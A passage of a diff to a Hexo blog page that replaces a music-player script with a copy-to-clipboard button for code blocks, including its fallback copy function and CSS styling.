+      button.setAttribute('title', succeeded ? '已复制' : state === 'failed' ? '复制失败' : '复制代码');
+      button.innerHTML = '<span class="fa fa-' + (succeeded ? 'check' : state === 'failed' ? 'times' : 'copy') + '" aria-hidden="true"></span>';
     }
-  }
 
-  function togglePlay() {
-    if (!audio.src) load(0);
-    if (audio.paused) {
-      audio.play().then(function() { setPlayState(true); }).catch(function() { setPlayState(false); });
-    } else {
-      audio.pause();
-      setPlayState(false);
+    function fallbackCopy(text) {
+      var textarea = document.createElement('textarea');
+      textarea.value = text;
+      textarea.style.position = 'fixed';
+      textarea.style.opacity = '0';
+      document.body.appendChild(textarea);
+      textarea.select();
+      var copied = document.execCommand('copy');
+      document.body.removeChild(textarea);
+      return copied;
     }
-  }
 
-  function next() { load((current + 1) % songs.length); }
-  function previous() { load((current - 1 + songs.length) % songs.length); }
+    button.addEventListener('click', function() {
+      var text = codeNode.textContent;
+      var operation = navigator.clipboard
+        ? navigator.clipboard.writeText(text).then(function() { return true; })
+        : Promise.resolve(fallbackCopy(text));
 
-  function renderPlaylist() {
-    elPlaylist.innerHTML = songs.map(function(song, index) {
-      return '<div class="pl-item' + (index === current ? ' active' : '') + '" role="option" aria-selected="' + (index === current) + '" data-idx="' + index + '">' + song.name + '</div>';
-    }).join('');
-  }
-
-  elPlay.addEventListener('click', togglePlay);
-  document.getElementById('btn-prev').addEventListener('click', previous);
-  document.getElementById('btn-next').addEventListener('click', next);
-
-  elVolume.addEventListener('input', function() {
-    audio.volume = this.value / 100;
+      operation.then(function(copied) {
+        setState(copied ? 'copied' : 'failed');
+      }).catch(function() {
+        setState(fallbackCopy(text) ? 'copied' : 'failed');
+      }).finally(function() {
+        setTimeout(function() { setState('idle'); }, 1800);
+      });
+    });
   });
-
-  elBtnPlaylist.addEventListener('click', function(event) {
-    event.stopPropagation();
-    var expanded = !elPlaylist.classList.contains('show');
-    elPlaylist.classList.toggle('show', expanded);
-    elBtnPlaylist.setAttribute('aria-expanded', String(expanded));
-  });
-
-  elPlaylist.addEventListener('click', function(event) {
-    var item = event.target.closest('.pl-item');
-    if (!item) return;
-    load(parseInt(item.getAttribute('data-idx'), 10));
-    audio.play().then(function() { setPlayState(true); }).catch(function() { setPlayState(false); });
-  });
-
-  document.addEventListener('click', function(event) {
-    if (!elPlaylist.contains(event.target) && event.target !== elBtnPlaylist) {
-      elPlaylist.classList.remove('show');
-      elBtnPlaylist.setAttribute('aria-expanded', 'false');
-    }
-  });
-
-  audio.addEventListener('timeupdate', function() {
-    elTime.textContent = fmtTime(audio.currentTime) + ' / ' + fmtTime(audio.duration || 0);
-  });
-  audio.addEventListener('ended', function() { next(); });
-  audio.addEventListener('pause', function() { setPlayState(false); });
-  audio.addEventListener('play', function() { setPlayState(true); });
-  audio.addEventListener('error', function() { setPlayState(false); });
-
-  renderPlaylist();
 })();
 </script>
+<style>
+.code-copy-btn {
+  position: absolute;
+  top: 8px;
+  right: 8px;
+  z-index: 10;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 30px;
+  height: 28px;
+  padding: 0;
+  background: rgba(13, 16, 18, 0.9);
+  border: 1px solid var(--gk-border);
+  border-radius: 3px;
+  color: var(--gk-muted);
+  cursor: pointer;
+  font-size: 11px;
+  opacity: 0.62;
+  transition: color 150ms ease, border-color 150ms ease, opacity 150ms ease;
+}
+
+figure.highlight:hover .code-copy-btn,
+.code-copy-btn:focus-visible {
+  opacity: 1;
+}
+
+.code-copy-btn:hover {
+  border-color: var(--gk-cyan);
+  color: var(--gk-cyan);
+}
+
+.code-copy-btn.copied {
+  border-color: var(--gk-green);
+  color: var(--gk-green);
+}
+</style>
 <!-- hexo injector body_end end --></body>
 </html>
 
